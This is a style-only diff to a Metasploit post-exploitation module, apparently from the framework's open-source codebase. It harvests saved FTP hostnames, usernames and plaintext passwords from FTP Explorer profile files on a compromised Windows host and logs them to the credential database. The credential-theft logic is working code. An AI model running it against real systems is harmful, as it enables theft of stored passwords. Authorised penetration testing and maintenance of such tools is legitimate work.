@@ -36,10 +36,10 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    grab_user_profiles().each do |user|
+    grab_user_profiles.each do |user|
       next if user['AppData'].nil?
 
-      xml = get_xml(user['AppData'] + "\\FTP Explorer\\profiles.xml")
+      xml = get_xml(user['AppData'] + '\\FTP Explorer\\profiles.xml')
       unless xml.nil?
         parse_xml(xml)
       end
@@ -47,25 +47,21 @@ class MetasploitModule < Msf::Post
   end
 
   def get_xml(path)
-    begin
-      connections = client.fs.file.new(path, 'r')
+    connections = client.fs.file.new(path, 'r')
 
-      condata = ''
-      until connections.eof
-        condata << connections.read
-      end
-      return condata
-    rescue Rex::Post::Meterpreter::RequestError => e
-      print_error "Error when reading #{path} (#{e.message})"
-      return nil
-    end
+    condata = ''
+    condata << connections.read until connections.eof
+    return condata
+  rescue Rex::Post::Meterpreter::RequestError => e
+    print_error "Error when reading #{path} (#{e.message})"
+    return nil
   end
 
   # Extracts the saved connection data from the XML.
   # Reports the credentials back to the database.
   def parse_xml(data)
     mxml = REXML::Document.new(data).root
-    mxml.elements.to_a("//FTPx10//Profiles//").each.each do |node|
+    mxml.elements.to_a('//FTPx10//Profiles//').each.each do |node|
       next if node.elements['Host'].nil?
       next if node.elements['Login'].nil?
       next if node.elements['Password'].nil?
@@ -76,7 +72,7 @@ class MetasploitModule < Msf::Post
       pass = node.elements['Password'].text
 
       # skip blank passwords
-      next if !pass or pass.empty?
+      next if !pass || pass.empty?
 
       # show results to the user
       print_good("#{session.sock.peerhost}:#{port} (#{host}) - '#{user}:#{pass}'")
@@ -85,15 +81,15 @@ class MetasploitModule < Msf::Post
       service_data = {
         address: Rex::Socket.getaddress(host),
         port: port,
-        protocol: "tcp",
-        service_name: "ftp",
+        protocol: 'tcp',
+        service_name: 'ftp',
         workspace_id: myworkspace_id
       }
 
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         username: user,
         private_data: pass,
         private_type: :password
@@ -103,7 +99,7 @@ class MetasploitModule < Msf::Post
 
       login_data = {
         core: credential_core,
-        access_level: "User",
+        access_level: 'User',
         status: Metasploit::Model::Login::Status::UNTRIED
       }
 
